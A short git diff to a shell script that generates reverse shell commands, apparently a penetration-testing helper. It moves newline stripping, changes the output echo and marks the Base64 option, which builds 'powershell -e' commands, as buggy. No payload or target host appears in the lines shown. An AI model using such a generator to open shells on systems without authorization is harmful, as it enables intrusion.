@@ -51,6 +51,7 @@ generate() {
         [[ "$OS" == "w"* ]] && CMD="powershell -e $B64"
     fi
 
+    CMD=$(echo $CMD | perl -pe 's/\n//g; s/$/\n/')
 
 
     # Copy to clipboard
@@ -60,7 +61,7 @@ generate() {
     echo "Copied the following reverseshell to the clipboard: "
     echo "----------------------------------------------------"
     echo ""
-    echo "$CMD" | perl -pe 's/\n//g; s/$/\n/'
+    echo "$CMD"
     echo ""
 
 }
@@ -91,7 +92,7 @@ help() {
       -i          Specify IP
       -s          Specify Shell
       -o          Specify OS
-      -e          Base64 encode the reverse shell 
+      -e          Base64 encode the reverse shell (Still a bit buggy, may not always work)
       -h          Show this help page
    
  
@@ -181,6 +182,5 @@ then
     getPort
 fi
 
-
-
 generate
+
